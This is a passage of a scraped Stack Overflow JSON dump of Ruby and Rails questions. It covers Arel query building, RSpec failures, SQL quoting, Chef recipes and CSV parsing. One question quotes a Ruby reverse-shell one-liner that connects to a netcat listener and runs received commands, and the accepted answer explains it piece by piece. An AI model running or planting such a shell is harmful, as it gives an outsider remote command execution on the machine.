redirect_to items_path\n  end\n\n  private\n\n  def item_params\n    params.require(:item).permit(:name, :cuisine_type, :price)\n  end\n\n\nend\n\n    class OrdersController &lt; ApplicationController\n\n  def index\n    @orders = Order.order(:party_id)\n    @items = Item.all\n    @parties = Party.all\n  end\n\n  def show\n    @orders = Order.find(params[:id])\n  end\n\n  def new\n    @order = Order.new\n    @orders = Order.all\n    @items = Item.all\n    @parties = Party.all\n  end\n\n  def create\n    puts \"Item ids #{params[:item][:item_id]}\"\n    food_items = params[:item][:item_id].drop(1).map{ |item| item.to_i}\n    @items = Item.where(\"id in (?)\", food_items)\n    @order = Order.new(order_params)\n      # items_array = params[:item][\"item_id\"].drop(1)\n    if @order.save\n        @items.each { |item|\n          @order.items &lt;&lt; item\n        }\n        redirect_to orders_path\n    else\n      redirect_to new_order_path\n    end\n  end\n\n  def destroy\n    @order = Order.find(params[:id])\n    @order.destroy\n    redirect_to orders_path\n  end\n\n\n  private\n  def order_params\n    params.require(:order).permit(:party_id, :item_id)\n  end\n\nend\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "shell", "command-line", "netcat"], "answers": [{"tags": [], "owner": {"reputation": 686, "user_id": 1491410, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2c938ed150a685b33d1b91266b382c8d?s=128&d=identicon&r=PG", "display_name": "elliotcm", "link": "https://stackoverflow.com/users/1491410/elliotcm"}, "is_accepted": true, "score": 6, "last_activity_date": 1535475177, "last_edit_date": 1535475177, "creation_date": 1535474849, "answer_id": 52062830, "question_id": 52062703, "link": "https://stackoverflow.com/questions/52062703/ruby-one-liner-breakdown/52062830#52062830", "title": "Ruby one-liner breakdown?", "body": "<p>OK, let's break this one down.</p>\n\n<pre><code>ruby\n</code></pre>\n\n<p>runs the ruby interpreter, you likely knew that part</p>\n\n<pre><code>-rsocket\n</code></pre>\n\n<p>does the equivalent of <code>require \"socket\"</code> (<code>r</code> for require)</p>\n\n<pre><code>-e \"some string\"\n</code></pre>\n\n<p>run <code>some string</code> as a ruby script (<code>e</code> for execute)</p>\n\n<pre><code>while(cmd=c.gets)\n</code></pre>\n\n<p>is saying \"while <code>gets</code> (get string up to and including the next newline) returns something from the connection <code>c</code>, i.e. while there's data coming in, assign it to <code>cmd</code> and..</p>\n\n<pre><code>IO.popen(cmd,'r'){|io|c.print io.read}\n</code></pre>\n\n<p>.. run <code>cmd</code> as a shell command, read the output, and <code>print</code> it back onto the connection <code>c</code>.</p>\n\n<p>So, effectively, receive a command (like <code>ls .</code> or <code>rm -rf /</code>) over the network, read it in, run it, take the output, and send it back.  Keep doing so until the other side stops sending commands.</p>\n\n<p>Because <code>gets</code> will block and wait for the next line to come in, this one-liner will sit there waiting until the connection is closed.</p>\n\n<p>Probably don't want to let other people send commands down that connection, since it'll run whatever they send directly on your computer, though that's presumably what you mean by \"reverse shell\".</p>\n"}], "owner": {"reputation": 79, "user_id": 9859420, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/ZUIXl.jpg?s=128&g=1", "display_name": "Nicole", "link": "https://stackoverflow.com/users/9859420/nicole"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 172, "favorite_count": 0, "accepted_answer_id": 52062830, "answer_count": 1, "score": 1, "last_activity_date": 1535475177, "creation_date": 1535474410, "question_id": 52062703, "link": "https://stackoverflow.com/questions/52062703/ruby-one-liner-breakdown", "title": "Ruby one-liner breakdown?", "body": "<p>I'm new to Ruby and trying to better understand this reverse shell one-liner designed to connect back to a Netcat listener. </p>\n\n<p>Can someone try breaking the command down and explaining what some of the code actually does? For example, I know \"TCPSocket.new\" creates the new TCP socket, but what's \"cmd=c.gets\", \"IO.popen\", \"|io|c.print io.read\", etc. And what is the purpose of the <code>while</code> loop?</p>\n\n<pre><code>ruby -rsocket -e \"c=TCPSocket.new('&lt;IP Address&gt;','&lt;Port&gt;');while(cmd=c.gets);IO.popen(cmd,'r'){|io|c.print io.read}end\"\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "rails-activerecord", "arel"], "comments": [{"owner": {"reputation": 113, "user_id": 5807128, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3nmbi.jpg?s=128&g=1", "display_name": "Froschgesicht", "link": "https://stackoverflow.com/users/5807128/froschgesicht"}, "edited": false, "score": 0, "creation_date": 1535469808, "post_id": 52061398, "comment_id": 91072984, "body": "Also, I&#39;d like a clean solution without concatenating SQL strings or <code>eval</code>ing strings with ruby code in them."}, {"owner": {"reputation": 18856, "user_id": 1359650, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/dffc4318ac93e728a26c8e8b51b4eb37?s=128&d=identicon&r=PG", "display_name": "jvillian", "link": "https://stackoverflow.com/users/1359650/jvillian"}, "edited": false, "score": 0, "creation_date": 1535470076, "post_id": 52061398, "comment_id": 91073164, "body": "Having build a rules engine, my thought is that your question is likely too broad to be meaningfully addressed here. But, good luck - it&#39;s a big project!"}, {"owner": {"reputation": 113, "user_id": 5807128, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3nmbi.jpg?s=128&g=1", "display_name": "Froschgesicht", "link": "https://stackoverflow.com/users/5807128/froschgesicht"}, "reply_to_user": {"reputation": 18856, "user_id": 1359650, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/dffc4318ac93e728a26c8e8b51b4eb37?s=128&d=identicon&r=PG", "display_name": "jvillian", "link": "https://stackoverflow.com/users/1359650/jvillian"}, "edited": false, "score": 0, "creation_date": 1535470441, "post_id": 52061398, "comment_id": 91073407, "body": "@jvillian I ask for an algorithm to parse AST-like JSON tree into actual Arel AST object used by ActiveRecord to build SQL queries in Rails. Guess you didn&#39;t understand the question, it&#39;s not about rule engines per se."}, {"owner": {"reputation": 18856, "user_id": 1359650, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/dffc4318ac93e728a26c8e8b51b4eb37?s=128&d=identicon&r=PG", "display_name": "jvillian", "link": "https://stackoverflow.com/users/1359650/jvillian"}, "edited": false, "score": 1, "creation_date": 1535471009, "post_id": 52061398, "comment_id": 91073768, "body": "Yes, I understand the question. And, it&#39;s very broad. <i>&quot;how to parse this JSON pseudo-AST tree into an actual Arel AST tree that ActiveRecord understands&quot;</i> is no small thing. I found building the engine quite rewarding, in the end. Hope it goes well for you."}], "answers": [{"comments": [{"owner": {"reputation": 113, "user_id": 5807128, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3nmbi.jpg?s=128&g=1", "display_name": "Froschgesicht", "link": "https://stackoverflow.com/users/5807128/froschgesicht"}, "edited": false, "score": 0, "creation_date": 1535536602, "post_id": 52074426, "comment_id": 91098803, "body": "There&#39;s a good article describing a more generalized approach, but for me it is probably <i>too broad</i> <a href=\"https://www.thegreatcodeadventure.com/composable-query-builders-with-arel-in-rails/\" rel=\"nofollow noreferrer\">thegreatcodeadventure.com/&hellip;</a>"}], "tags": [], "owner": {"reputation": 113, "user_id": 5807128, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3nmbi.jpg?s=128&g=1", "display_name": "Froschgesicht", "link": "https://stackoverflow.com/users/5807128/froschgesicht"}, "is_accepted": true, "score": 0, "last_activity_date": 1535654378, "last_edit_date": 1535654378, "creation_date": 1535536069, "answer_id": 52074426, "question_id": 52061398, "link": "https://stackoverflow.com/questions/52061398/parse-json-into-an-sql-query-with-arel/52074426#52074426", "title": "Parse JSON into an SQL query with AREL", "body": "<p>Looks like <code>grouping</code> method is the way to create an Arel object that can be passed to <code>Arel::SelectManager</code>. Here's what I came up with:</p>\n\n<pre><code>require 'rails_helper'\nRSpec.describe CompositeProcessor do\n\n  MUTEX = Mutex.new\n\n  before (:each) do\n    @joins = json_tree.to_s.scan(/\\D(\\d+)\\D/).map.with_index{ |item,i| i+1 }\n  end\n\n  def parse (tree)\n    if Hash === tree\n      raise 'There can be only one operator' if tree.keys.size != 1\n      operator, operands = tree.to_a.first\n      raise 'Operands should be in an array' if operands.class != Array\n      raise 'There should be at least two operands' if operands.size &lt; 2\n      operands = parse(operands)\n      query = operands.shift\n      operands.each do |operand|\n        query = query.send(operator, operand)\n      end\n      tree = UserMatch.arel_table.grouping(query)\n    elsif Array === tree\n      tree.map! do |item|\n        case item\n        when Hash\n          parse(item)\n        when Integer\n          MUTEX.synchronize do\n            id = @joins.shift\n            UserMatch.arel_table.alias(\"t#{id}\")[:rule_id].eq(item)\n          end\n        end\n      end\n    end\n    return tree\n  end\n\n  context \"being passed a JSON tree of predicates\" do\n    let(:json_tree) { { \"or\":[ { \"and\":[ { \"or\":[ 21, 42 ] }, 84 ] }, { \"or\":[ 168, 336 ] } ] } }\n    it \"parses it into valid arel AST\" do\n      expect(parse(json_tree).to_sql).to eq('(((\"t1\".\"rule_id\" = 21 OR \"t2\".\"rule_id\" = 42) AND \"t3\".\"rule_id\" = 84) OR (\"t4\".\"rule_id\" = 168 OR \"t5\".\"rule_id\" = 336))')\n    end\n  end\nend\n</code></pre>\n\n<p>This solution requires an instance variable: because each condition should be evaluated on a new self-join alias (t1, t2, etc.) we need to store how many joins we have yet to process.</p>\n\n<p>The final SQL will look something like this:</p>\n\n<pre><code>SELECT DISTINCT t1.user_id\nFROM user_matches as t1 \nINNER JOIN user_matches AS t2 ON (t1.user_id = t2.user_id)\nINNER JOIN user_matches AS t3 ON (t2.user_id = t3.user_id)\nWHERE t1.rule_id = 1 \nAND (t2.rule_id = 2\n  OR t3.rule_id = 4)\n</code></pre>\n"}], "owner": {"reputation": 113, "user_id": 5807128, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/3nmbi.jpg?s=128&g=1", "display_name": "Froschgesicht", "link": "https://stackoverflow.com/users/5807128/froschgesicht"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 770, "favorite_count": 1, "accepted_answer_id": 52074426, "answer_count": 1, "score": 2, "last_activity_date": 1537215561, "creation_date": 1535469746, "last_edit_date": 1537215561, "question_id": 52061398, "link": "https://stackoverflow.com/questions/52061398/parse-json-into-an-sql-query-with-arel", "title": "Parse JSON into an SQL query with AREL", "body": "<p>I am building a rules engine, where some of the rules are logical predicates on top of lower-level \"if-then\" rules.</p>\n\n<p>So in other words, I have a join table that stores matches between users and rules that these users were found to satisfy. Once lower-order rules are processed, the engine evaluates higher-level rules and creates new matches for users that satisfy them.</p>\n\n<pre><code>'user_matches':\n+---------+---------+-----------+\n| rule_id | user_id | rule_type |\n+---------+---------+-----------+\n| 1       | 1       | simple    |\n+---------+---------+-----------+\n| 2       | 1       | simple    |\n+---------+---------+-----------+\n| 1       | 2       | simple    |\n+---------+---------+-----------+\n| 3       | 1       | compound  |\n+---------+---------+-----------+\n</code></pre>\n\n<p>In the example above the Rule #3 requires users to satisfy both Rule #1 and Rule #2. User #1 matches this rule, User #2 does not.</p>\n\n<p>Since I want to avoid hitting the DB multiple times, I need a way to turn such predicates into plain SQL queries that I'll then pass to <code>Arel::InsertManager</code>. Here's the gist of it:</p>\n\n<pre><code>UserMatch.select(UserMatch.arel_table[:user_id])\n  .where(UserMatch.arel_table[:rule_id].eq(1)\n  .and(UserMatch.arel_table[:rule_id].eq(2))).to_sql\n\n=&gt; SELECT \"user_matches\".\"user_id\" \nFROM \"user_matches\" \nWHERE (\"user_matches\".\"rule_id\" = 1 \nAND \"user_matches\".\"rule_id\" = 2)\n</code></pre>\n\n<p>I am storing the rules tree as JSON:</p>\n\n<pre><code>{  \n   \"or\":[  \n      {  \n         \"and\":[  \n            {  \n               \"or\":[  \n                  21,\n                  42\n               ]\n            },\n            84\n         ]\n      },\n      {  \n         \"or\":[  \n            168,\n            336\n         ]\n      }\n   ]\n}\n</code></pre>\n\n<p>The problem, as you can see, is that these rules can be nested in an infinite number of ways. So I probably need a recursive loop here. Can't come up with one. Hope you guys help me out and give me at least a direction on how to parse this JSON pseudo-AST tree into an actual Arel AST tree. </p>\n\n<p>Thanks!</p>\n\n<p><strong>UPDATE:</strong> Turns out you can't use the same table twice in an SQL statement, see the answer below.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "rspec"], "comments": [{"owner": {"reputation": 4338, "user_id": 299774, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/eab8557a9cb59427455bac3cc59d2802?s=128&d=identicon&r=PG", "display_name": "Grzegorz", "link": "https://stackoverflow.com/users/299774/grzegorz"}, "edited": false, "score": 6, "creation_date": 1535469446, "post_id": 52060985, "comment_id": 91072727, "body": "Shouldn&#39;t it be <code>response.body.should have_text</code>??"}, {"owner": {"reputation": 503, "user_id": 5057085, "user_type": "registered", "accept_rate": 26, "profile_image": "https://i.stack.imgur.com/hDmH7.jpg?s=128&g=1", "display_name": "Coder_Nick", "link": "https://stackoverflow.com/users/5057085/coder-nick"}, "reply_to_user": {"reputation": 4338, "user_id": 299774, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/eab8557a9cb59427455bac3cc59d2802?s=128&d=identicon&r=PG", "display_name": "Grzegorz", "link": "https://stackoverflow.com/users/299774/grzegorz"}, "edited": false, "score": 0, "creation_date": 1535470084, "post_id": 52060985, "comment_id": 91073173, "body": "That was it. Thanks."}], "answers": [{"tags": [], "owner": {"reputation": 4338, "user_id": 299774, "user_type": "registered", "accept_rate": 94, "profile_image": "https://www.gravatar.com/avatar/eab8557a9cb59427455bac3cc59d2802?s=128&d=identicon&r=PG", "display_name": "Grzegorz", "link": "https://stackoverflow.com/users/299774/grzegorz"}, "is_accepted": true, "score": 1, "last_activity_date": 1535487632, "creation_date": 1535487632, "answer_id": 52065659, "question_id": 52060985, "link": "https://stackoverflow.com/questions/52060985/rspec-controller-test-failing-for-text-on-screen/52065659#52065659", "title": "RSpec Controller test failing for text on screen", "body": "<p><code>response</code> holds stuff like headers, response code, and response body. So if you want to check for the rendered views - you should check <code>response.body</code>:</p>\n\n<pre><code>response.body.should have_text(\"Settings\")\n</code></pre>\n"}], "owner": {"reputation": 503, "user_id": 5057085, "user_type": "registered", "accept_rate": 26, "profile_image": "https://i.stack.imgur.com/hDmH7.jpg?s=128&g=1", "display_name": "Coder_Nick", "link": "https://stackoverflow.com/users/5057085/coder-nick"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 73, "favorite_count": 0, "accepted_answer_id": 52065659, "answer_count": 1, "score": 0, "last_activity_date": 1535487632, "creation_date": 1535468526, "question_id": 52060985, "link": "https://stackoverflow.com/questions/52060985/rspec-controller-test-failing-for-text-on-screen", "title": "RSpec Controller test failing for text on screen", "body": "<p>I have an index view with \"Settings\" in an h1 element.</p>\n\n<pre><code>&lt;div id=\"settings-main-container\"&gt;\n  &lt;div id=\"settings-main-title\"&gt;\n    &lt;h1 id=\"settings-title\"&gt;Settings&lt;/h1&gt;\n  &lt;/div&gt;\n  &lt;%=link_to admin_clients_index_path do%&gt;\n    &lt;div class=\"settings-button\"&gt;\n      Select Active Client\n    &lt;/div&gt;\n &lt;%end%&gt;\n &lt;%=link_to admin_settings_assign_users_to_clients_index_path do%&gt;\n    &lt;div class=\"settings-button\"&gt;\n        Assign Users to Clients\n    &lt;/div&gt;\n &lt;%end%&gt;\n &lt;%=link_to destroy_user_session_path, method: :delete do%&gt;\n   &lt;div class=\"settings-button\"&gt;\n     Logout\n   &lt;/div&gt;\n &lt;%end%&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>I have my test set up </p>\n\n<pre><code>describe \"GET index\" do\n  render_views\n  ...\n\n  it \"should have text on the screen\" do\n    get :index\n    response.should have_text(\"Settings\")\n  end\nend\n</code></pre>\n\n<p>I keep getting the error </p>\n\n<pre><code>Failure/Error: response.should have_text(\"Settings\")\n   expected to find text \"Settings\" in \"#\"\n</code></pre>\n\n<p>Any help will be appreciated.</p>\n"}, {"tags": ["ruby", "rspec"], "answers": [{"comments": [{"owner": {"reputation": 1, "user_id": 10285395, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-P_N7kIEiLPQ/AAAAAAAAAAI/AAAAAAAAACc/13VSzbt9Yog/photo.jpg?sz=128", "display_name": "Aobo", "link": "https://stackoverflow.com/users/10285395/aobo"}, "edited": false, "score": 0, "creation_date": 1535468726, "post_id": 52060979, "comment_id": 91072268, "body": "thank you that worked. I missed the instantiation doh!"}], "tags": [], "owner": {"reputation": 4103, "user_id": 4271125, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/VQnWR.jpg?s=128&g=1", "display_name": "djaszczurowski", "link": "https://stackoverflow.com/users/4271125/djaszczurowski"}, "is_accepted": false, "score": 0, "last_activity_date": 1535468504, "creation_date": 1535468504, "answer_id": 52060979, "question_id": 52060894, "link": "https://stackoverflow.com/questions/52060894/why-is-rspec-giving-a-nomethoderror-when-method-exists/52060979#52060979", "title": "Why is RSpec giving a NoMethodError when method exists?", "body": "<p><code>CalculatorCLI</code> is a class, and you're missing its initialization</p>\n\n<p>either change <code>CalculatorCLI.parse</code> to CalculatorCLI.new.parse<code>or change</code>def parse<code>to</code>def self.parse<code>in</code>CalculatorCLI` definition</p>\n"}], "owner": {"reputation": 1, "user_id": 10285395, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-P_N7kIEiLPQ/AAAAAAAAAAI/AAAAAAAAACc/13VSzbt9Yog/photo.jpg?sz=128", "display_name": "Aobo", "link": "https://stackoverflow.com/users/10285395/aobo"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 53, "favorite_count": 0, "answer_count": 1, "score": -2, "last_activity_date": 1535468563, "creation_date": 1535468268, "last_edit_date": 1535468563, "question_id": 52060894, "link": "https://stackoverflow.com/questions/52060894/why-is-rspec-giving-a-nomethoderror-when-method-exists", "title": "Why is RSpec giving a NoMethodError when method exists?", "body": "<p>I'm getting the error below</p>\n\n<pre><code>$ bundle exec rspec calculatorcli_spec.rb\n\n Failure/Error: c = CalculatorCLI.parse\n\n NoMethodError:\n   undefined method `parse' for CalculatorCLI:Class\n</code></pre>\n\n<p>from the below simple calculator class</p>\n\n<p><img src=\"https://i.stack.imgur.com/KtuDb.png\" alt=\"image of the code\"></p>\n"}, {"tags": ["ruby-on-rails", "ruby", "postgresql", "ruby-on-rails-4"], "comments": [{"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1535461500, "post_id": 52058384, "comment_id": 91067470, "body": "Try to swap quotes."}], "answers": [{"tags": [], "owner": {"reputation": 4348, "user_id": 3435610, "user_type": "registered", "accept_rate": 95, "profile_image": "https://i.stack.imgur.com/IBOFX.jpg?s=128&g=1", "display_name": "Sara Tibbetts", "link": "https://stackoverflow.com/users/3435610/sara-tibbetts"}, "is_accepted": false, "score": 5, "last_activity_date": 1535461490, "creation_date": 1535461490, "answer_id": 52058663, "question_id": 52058384, "link": "https://stackoverflow.com/questions/52058384/postgresql-issue-when-updating-value-into-one-column-which-is-text-datatype/52058663#52058663", "title": "Postgresql: Issue when updating value into one column which is text datatype", "body": "<p>This is occurring because you are using <code>\"</code> instead of <code>'</code>. Try using: </p>\n\n<pre><code>UPDATE table1 SET item_value='{ value:\"BOX\",id:\"2580\"}' where id=643\n</code></pre>\n\n<p>Because of this, you will need to change the quotes within the JSON string to be <code>\"</code></p>\n"}], "owner": {"reputation": 899, "user_id": 1986039, "user_type": "registered", "accept_rate": 26, "profile_image": "https://i.stack.imgur.com/lLSu0.jpg?s=128&g=1", "display_name": "Developer", "link": "https://stackoverflow.com/users/1986039/developer"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 42, "favorite_count": 0, "answer_count": 1, "score": 0, "last_activity_date": 1535461490, "creation_date": 1535460603, "question_id": 52058384, "link": "https://stackoverflow.com/questions/52058384/postgresql-issue-when-updating-value-into-one-column-which-is-text-datatype", "title": "Postgresql: Issue when updating value into one column which is text datatype", "body": "<p>I have one table, that have one field (item_value) which is a text data type, and i am trying to update through psql:</p>\n\n<pre><code>UPDATE table1 SET item_value=\"{ value:'BOX',id:'2580'}\" where id=643\n</code></pre>\n\n<p>this query shows </p>\n\n<pre><code> column \"{ value:'BOX',id:'2580'}\" does not exist\n</code></pre>\n\n<p>But when i do it from rails console, this will work</p>\n\n<pre><code>t = Table1.find 643\nt.item_value = \"{ value:'BOX',id:'2580'}\"\nt.save\n\nt.item_value.class\n=&gt; String \n</code></pre>\n\n<p>Any issue with that query? anything needs to do with cast</p>\n"}, {"tags": ["ruby", "chef-infra", "cidr"], "comments": [{"owner": {"reputation": 1365, "user_id": 4894399, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-tY1Cz7EDNxc/AAAAAAAAAAI/AAAAAAAABb4/3Qa15VP4_ZY/photo.jpg?sz=128", "display_name": "Szymon Szypulski", "link": "https://stackoverflow.com/users/4894399/szymon-szypulski"}, "edited": false, "score": 0, "creation_date": 1535463873, "post_id": 52056832, "comment_id": 91069034, "body": "I am not sure what you are trying to achieve in the third line of your block, but you have unescaped <code>&quot;</code> as suggested by ruby. You cannot have <code>&quot;</code> wrapper with <code>&quot;&quot;</code>."}], "answers": [{"tags": [], "owner": {"reputation": 43208, "user_id": 78722, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cf611565f0b79abd0b3dc200ad867661?s=128&d=identicon&r=PG", "display_name": "coderanger", "link": "https://stackoverflow.com/users/78722/coderanger"}, "is_accepted": true, "score": 2, "last_activity_date": 1535514909, "creation_date": 1535514909, "answer_id": 52069228, "question_id": 52056832, "link": "https://stackoverflow.com/questions/52056832/use-chef-file-insert-line-if-no-match-method-for-cidr-address/52069228#52069228", "title": "use Chef file.insert_line_if_no_match method for CIDR address", "body": "<p>FileEdit is an internal class and using it from recipe code is <em>NOT SUPPORTED</em>. Do not use it. Period.</p>\n\n<p>That said, the problem is you have unescaped double quotes in your string.</p>\n"}, {"tags": [], "owner": {"reputation": 318, "user_id": 1343713, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/036b528d6c1a4dcda835bcb30abd32fe?s=128&d=identicon&r=PG", "display_name": "Neal", "link": "https://stackoverflow.com/users/1343713/neal"}, "is_accepted": false, "score": 1, "last_activity_date": 1535522793, "creation_date": 1535522793, "answer_id": 52070500, "question_id": 52056832, "link": "https://stackoverflow.com/questions/52056832/use-chef-file-insert-line-if-no-match-method-for-cidr-address/52070500#52070500", "title": "use Chef file.insert_line_if_no_match method for CIDR address", "body": "<p>Instead of <code>insert_line_if_no_match</code> you can deal with it another way, using bash and grep. I have added the way to another question you can have a look <a href=\"https://stackoverflow.com/questions/51848305/how-to-update-the-file-with-multiple-lines-without-deleting-the-contents-of-the/52051405#52051405\">here</a></p>\n\n<p>here is the bash resource i usually use to append to files only if there is no match:</p>\n\n<pre><code>bash 'append line(s) to file if it doesnt exist' do\n  user 'user'\n  code &lt;&lt;-EOS\n    cat &gt;&gt;/home/file &lt;&lt;EOL\n      *.* @@172.167.189.67:514\n    EOL\n   EOS\n  not_if \"grep -q 172.167.189.67 /home/file\"\nend\n</code></pre>\n\n<p>you may need to run cookstyle on that ^</p>\n"}], "owner": {"reputation": 8975, "user_id": 454488, "user_type": "registered", "accept_rate": 77, "profile_image": "https://i.stack.imgur.com/ohaDv.gif?s=128&g=1", "display_name": "kamal", "link": "https://stackoverflow.com/users/454488/kamal"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 864, "favorite_count": 0, "accepted_answer_id": 52069228, "answer_count": 2, "score": 0, "last_activity_date": 1535522793, "creation_date": 1535455962, "question_id": 52056832, "link": "https://stackoverflow.com/questions/52056832/use-chef-file-insert-line-if-no-match-method-for-cidr-address", "title": "use Chef file.insert_line_if_no_match method for CIDR address", "body": "<p>I am trying to use <code>file.insert_line_if_no_match</code> for CIDR address:</p>\n\n<p>attributes/default.rb:</p>\n\n<pre><code>default[\"chefclustercidr\"][\"ip\"] = \"a.b.c.d/24\"\n</code></pre>\n\n<p>recipe/default.rb</p>\n\n<pre><code>ruby_block \"chef-backend.rb\" do\nblock do\n  file = Chef::Util::FileEdit.new(\"/etc/chef-backend/chef-backend.rb\")\n  file.insert_line_if_no_match(\"/publish_address/\" , \"publish_address i#{node['chefclusterbe1']['ip']}\")\n  file.insert_line_if_no_match(\"/postgresql/\" , \"postgresql.md5_auth_cidr_addresses = [\"samehost\", \"samenet\", \"#{node['chefclustercidr']['ip']}/24\"]\")\n  file.write_file\n  end\nend\n</code></pre>\n\n<p>but getting ruby syntax error\n$ruby -c default.rb</p>\n\n<pre><code>default.rb:95: syntax error, unexpected tIDENTIFIER, expecting ')'\nth_cidr_addresses = [\"samehost\", \"samenet\",\"#{node['chefclus\n                              ^\ndefault.rb:95: syntax error, unexpected tIDENTIFIER, expecting keyword_end\nresses = [\"samehost\", \"samenet\",\"#{node['chefclustercidr']['\n                              ^\ndefault.rb:99: syntax error, unexpected keyword_end, expecting end-of-input\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "csv", "parsing"], "comments": [{"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 2, "creation_date": 1535457484, "post_id": 52056803, "comment_id": 91064740, "body": "You can specify the delimiter via <code>CSV.for_each(filename, col_sep: &#39;&#166;&#39;) do ...</code>. See <a href=\"http://ruby-doc.org/stdlib-2.5.1/libdoc/csv/rdoc/CSV.html#method-c-new\" rel=\"nofollow noreferrer\"><code>CSV.new</code></a> for available options."}], "answers": [{"comments": [{"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1535457067, "post_id": 52057072, "comment_id": 91064484, "body": "Why do you expect the CSV file to be ISO 8859-1 encoded? And where does <code>\\xC2</code> come from?"}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1535457207, "post_id": 52057072, "comment_id": 91064580, "body": "@Stefan I just showed an approach, I assume OP knows better what encoding to use. <code>\\xC2</code> came from reverse engineering :)"}], "tags": [], "owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "is_accepted": false, "score": 1, "last_activity_date": 1535456750, "creation_date": 1535456750, "answer_id": 52057072, "question_id": 52056803, "link": "https://stackoverflow.com/questions/52056803/rails-parse-csv-separtor/52057072#52057072", "title": "Rails parse csv separtor &#166;", "body": "<p>Why would you expect <code>CSV</code> to know how to handle this weird input? You should explicitly specify the encoding and the column separator.</p>\n\n<pre><code>CSV.read(\"#{Rails.root}/csv_files/suppliers.csv\",\n      encoding: Encoding::ISO_8859_1,\n      col_sep: \"\\xC2\\xA6\".force_encoding(Encoding::ISO_8859_1)) do |supplier|\n  puts supplier.inspect\nend\n#\u21d2 [[\"2783\", \"Larson and Sons\"],\n#   [\"967\", \"Becker Group\"],\n#   [\"333\", \"Rolfson LLC\"]]\n</code></pre>\n"}], "owner": {"reputation": 23, "user_id": 10284396, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/3b78a23a7c3b94f23013bbc0f195d2cf?s=128&d=identicon&r=PG&f=1", "display_name": "bull", "link": "https://stackoverflow.com/users/10284396/bull"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 93, "favorite_count": 0, "answer_count": 1, "score": 2, "last_activity_date": 1535458085, "creation_date": 1535455878, "last_edit_date": 1535458085, "question_id": 52056803, "link": "https://stackoverflow.com/questions/52056803/rails-parse-csv-separtor", "title": "Rails parse csv separtor &#166;", "body": "<p>i have csv file with strange format </p>\n\n<pre><code>2783\u00a6Larson and Sons\n967\u00a6Becker Group\n333\u00a6Rolfson LLC\n</code></pre>\n\n<p>I have tried to do this</p>\n\n<pre><code>CSV.foreach(\"#{Rails.root}/csv_files/suppliers.csv\") do |supplier|\n  p supplier[0]\nend\n</code></pre>\n\n<p>but have got a string <code>\"2783\u00a6Larson and Sons\"</code></p>\n\n<p>How to separate values? \nFor example will return</p>\n\n<pre><code>supplier[0] #=&gt; \"2783\"\nsupplier[1] #=&gt; \"Larson and Sons\"\n</code></pre>\n"}, {"tags": ["ruby", "ruby-hash"], "comments": [{"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": 